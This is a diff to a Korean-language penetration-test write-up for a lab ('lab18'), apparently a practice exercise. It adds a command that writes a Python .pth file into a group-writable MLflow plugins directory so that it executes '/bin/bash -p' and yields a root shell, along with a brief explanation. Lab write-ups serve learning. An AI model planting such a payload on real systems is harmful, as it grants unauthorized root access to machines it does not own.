@@ -2,7 +2,7 @@
 publish: true
 title: 모의해킹 보고서 - lab18
 created: 2026-11-12
-modified: 2026-11-12T18:33:53.763Z
+modified: 2026-11-12T18:38:44.576Z
 published: 2026-11-12
 date: 2026-11-12
 tags:
@@ -280,6 +280,15 @@ for path in PLUGINS_DIR.iterdir():
 ![[00. Setting/00. 첨부파일/Pasted image 20261112181916.png]]
 
 `/opt/tools/mlflow_ctl/plugins` 에 가보면 `core`와 `dev`가 있다. 그중 `dev`는 `devs`그룹에 쓰기 권한이 있다. 앞서 확인 했을 때 `svcweb`이 `devs`의 그룹에 속해 있었으니 현재 사용자에게 쓰기 권한이 있다.
+
+![[00. Setting/00. 첨부파일/Pasted image 20261113033451.png]]
+
+```
+printf '%s\n' 'import os; os.execl("/bin/bash", "bash", "-p")' > /opt/tools/mlflow_ctl/plugins/dev/root.pth
+```
+
+`%s\n` -> 문자열을 출력하고 끝에 줄바꿈을 붙여라.
+`/bin/bash`를 실행 권한을 유지한 채(root)
 
 ![[00. Setting/00. 첨부파일/Pasted image 20261113032810.png]]
 
